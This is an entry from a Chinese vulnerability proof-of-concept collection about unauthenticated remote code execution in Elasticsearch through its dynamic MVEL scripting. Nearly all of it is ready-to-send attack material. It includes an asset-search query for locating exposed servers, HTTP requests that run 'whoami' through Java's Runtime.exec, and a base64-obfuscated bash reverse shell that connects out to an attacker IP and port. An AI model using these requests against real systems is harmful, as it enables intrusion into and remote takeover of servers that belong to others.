---
source: "wy876 漏洞文库"
---

# Elasticsearch存在未授权访问导致的RCE

# 一、漏洞描述
Elasticsearch向使用者提供执行脚本代码的功能，支持mvel, js,groovy,python,和native语言，默认脚本语言为mvel。由于mvel语言功能较为强大，可以直接执行java代码，而且官方默认没有关闭用户可通过http操控这一功能的接口（script.disable_dynamic），从而导致恶意用户可以通过这个功能远程执行任意Java代码。

# 二、影响版本
Elasticsearch

# 三、资产测绘
```plain
app="Elasticsearch"
```


# 三、漏洞复现
1、利用该漏洞要求Elasticsearch中有数据，所以先创建一条数据

```plain
POST /website/blog/ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

{
    "name": "colleget"
}
```


2、执行命令

```plain
POST /_search?pretty HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 372

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
    }
}
```


3、反弹shell

```plain
POST /_search?pretty HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 372

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"bash -c {echo,YmFaaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjcwLzc1MzIgMD4mMQ==}|{base64,-d}|{bash,-i}\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
    }
}

```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kg7yzqstede6zu7x>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
